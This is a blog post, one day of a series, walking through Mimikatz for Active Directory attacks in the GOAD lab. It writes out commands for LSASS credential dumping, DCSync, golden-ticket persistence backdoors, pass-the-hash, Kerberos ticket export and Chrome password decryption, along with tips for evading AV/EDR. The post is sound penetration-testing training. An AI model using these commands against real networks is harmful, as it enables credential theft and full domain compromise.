---
layout: post
title: "10 Days of AD Security: Day 4 - Mimikatz"
date: 2026-03-26
category: Active Directory Security
author: James Wells
---

## History and Overview

Mimikatz is arguably the most famous offensive security tool ever created, fundamentally changing how we think about Windows credential security. Developed by Benjamin Delpy (@gentilkiwi) starting in 2007, Mimikatz began as a proof-of-concept demonstrating weaknesses in Windows authentication. The tool's name is a playful combination of "mimi" (cute in French) and "Katz" (cats in German), reflecting Delpy's lighthearted approach to serious security research. Mimikatz works by extracting plaintexts passwords, NTLM hashes, PIN codes, and Kerberos tickets directly from Windows memory (LSASS process), exploiting the fact that Windows caches credentials to enable Single Sign-On functionality. The tool's revelation that Windows stored reversibly encrypted credentials in memory led Microsoft to implement significant security improvements, including Credential Guard and Protected Process Light. Despite being released in 2011 and having its last major update in September 2022, Mimikatz remains widely used in penetration testing and continues to appear in real-world attacks, with Red Canary reporting it affected 3.1% of monitored customers in 2026 (though most detections are from security testing rather than malicious use). While newer alternatives exist, Mimikatz's legacy and comprehensive feature set ensure its continued relevance.

## Download and Installation

**Official Source:** [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

**Installation:**

```powershell
# Download pre-compiled binary from releases
# https://github.com/gentilkiwi/mimikatz/releases

# Extract the ZIP file
# Navigate to x64 folder for 64-bit Windows

# Execute (requires administrator privileges)
.\mimikatz.exe
```

**OPSEC Warning:**
- Mimikatz is universally detected by AV/EDR solutions
- Windows Defender will quarantine it immediately
- Consider alternatives: pypykatz, SharpDPAPI, or comsvcs.dll (LOLBAS technique)
- Use only in authorized penetration tests or red team engagements
- Disable real-time protection for testing (authorized environments only)

**Privilege Requirements:**
- Most operations require Administrator or SYSTEM privileges
- Some features require SeDebugPrivilege
- May need to elevate privileges within mimikatz

## When to Use Mimikatz

Use Mimikatz when you need to:
- **Extract plaintext passwords**: From LSASS memory (older systems, disabled protections)
- **Dump NTLM hashes**: For pass-the-hash attacks
- **Extract Kerberos tickets**: For pass-the-ticket attacks
- **Perform DCSync**: Replicate AD credentials without touching the DC disk
- **Create Golden/Silver Tickets**: With compromised KRBTGT or service account hashes
- **Bypass authentication**: Using various credential injection techniques
- **Extract DPAPI secrets**: Decrypt stored credentials from browsers, VPN clients, etc.
- **Demonstrate credential theft risk**: During security awareness training

Mimikatz is primarily used post-exploitation after achieving admin/SYSTEM on a Windows host, typically for credential harvesting and lateral movement preparation.

## Walkthrough

**Basic Operations:**

```
# Start mimikatz
mimikatz.exe

# Enable debug privilege
privilege::debug

# Check if privilege granted (should return '20 OK')
```

**Attack 1: Dump Credentials from LSASS**

```
# Extract all credentials from memory
sekurlsa::logonpasswords

# This displays:
# - Usernames
# - Domains
# - NTLM hashes
# - Plaintext passwords (if available)
# - Kerberos tickets
```

**Attack 2: DCSync Attack**

Replicate credentials from Domain Controller without logging in:

```
# DCSync specific user
lsadump::dcsync /user:Administrator /domain:example.local

# DCSync entire domain (KRBTGT, all users)
lsadump::dcsync /domain:example.local /all /csv

# Output includes NTLM hashes for pass-the-hash attacks
```

**Attack 3: Golden Ticket Creation**

```
# Create Golden Ticket (requires KRBTGT hash from DCSync)
kerberos::golden /user:fakeadmin /domain:example.local /sid:S-1-5-21-[domain-sid] /krbtgt:[krbtgt_hash] /id:500 /ptt

# /ptt = pass-the-ticket (inject immediately)
# Ticket grants unlimited domain access for 10 years
```

**Attack 4: Pass-the-Hash**

```
# Use NTLM hash instead of password
sekurlsa::pth /user:administrator /domain:example.local /ntlm:[hash] /run:cmd.exe

# Opens new cmd.exe with administrator context
# Can now access resources as administrator
```

**Attack 5: Extracting Kerberos Tickets**

```
# Export all Kerberos tickets
sekurlsa::tickets /export

# This creates .kirbi files that can be:
# - Used for pass-the-ticket attacks
# - Cracked offline (if they're service tickets)
# - Converted to other formats
```

**DPAPI Credential Extraction:**

```
# Extract master keys
sekurlsa::dpapi

# Decrypt Chrome passwords (example)
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /masterkey:[key]
```

## Game of Active Directory Lab Example

In the GOAD environment, Mimikatz enables rapid privilege escalation:

**Scenario: From Local Admin to Domain Admin**

1. **Initial Access**: We've compromised a workstation and have local admin rights

2. **Credential Extraction**:
   ```
   # From elevated mimikatz session
   privilege::debug
   sekurlsa::logonpasswords

   # GOAD lab will reveal cached credentials for:
   # - Local accounts
   # - Domain accounts that logged into this system
   # - Service accounts running scheduled tasks
   ```

3. **Discovering Higher Privileges**:
   ```
   # Example output might show:
   Username: jon.snow
   Domain: north.sevenkingdoms.local
   NTLM: [hash]
   Password: [if available]

   # jon.snow is Domain Admin in GOAD!
   ```

4. **Lateral Movement with Pass-the-Hash**:
   ```
   sekurlsa::pth /user:jon.snow /domain:north.sevenkingdoms.local /ntlm:[hash] /run:powershell.exe

   # New PowerShell window opens with DA context
   ```

5. **DCSync for Complete Domain Compromise**:
   ```
   # Now that we're DA, replicate all credentials
   lsadump::dcsync /domain:north.sevenkingdoms.local /all /csv > goad-domain-hashes.csv

   # This includes:
   # - Administrator account
   # - KRBTGT (for Golden Tickets)
   # - All user and computer accounts
   # - Service accounts
   ```

6. **Golden Ticket for Persistence**:
   ```
   # Create persistent backdoor
   kerberos::golden /user:backdoor /domain:north.sevenkingdoms.local /sid:S-1-5-21-[sid] /krbtgt:[krbtgt_hash] /id:500 /groups:512,513,518,519,520 /ptt

   # Ticket valid for 10 years, survives password changes
   ```

**GOAD-Specific Use Cases:**
- Extract credentials from the domain controller (Winterfell)
- Dump secrets from the SQL servers where service accounts log in
- Create tickets for cross-domain access (North → Essos → Meereen)
- Demonstrate the impact of cached credentials on jump boxes

## Conclusion

Mimikatz revolutionized offensive security by exposing fundamental weaknesses in Windows credential storage. While Microsoft has added protections like Credential Guard, many organizations haven't deployed these defenses, leaving Mimikatz highly effective even in 2026. Its impact extends beyond penetration testing—Mimikatz forced the security industry to rethink credential protection and led to significant architectural improvements in Windows.

In the GOAD lab, Mimikatz serves as the primary tool for post-exploitation credential harvesting. Its ability to dump cached credentials and perform DCSync attacks makes it central to most attack paths leading to domain compromise. While the tool hasn't been updated since 2022, its core functionality remains relevant because it exploits architectural decisions in Windows rather than specific vulnerabilities.

For defenders, understanding Mimikatz is crucial for implementing proper credential hygiene, enabling modern protections, and detecting the tool's telemetry in Windows Event Logs.

**Next in this series:** Day 5 will cover NetExec, the modern successor to CrackMapExec for large-scale network execution and lateral movement.
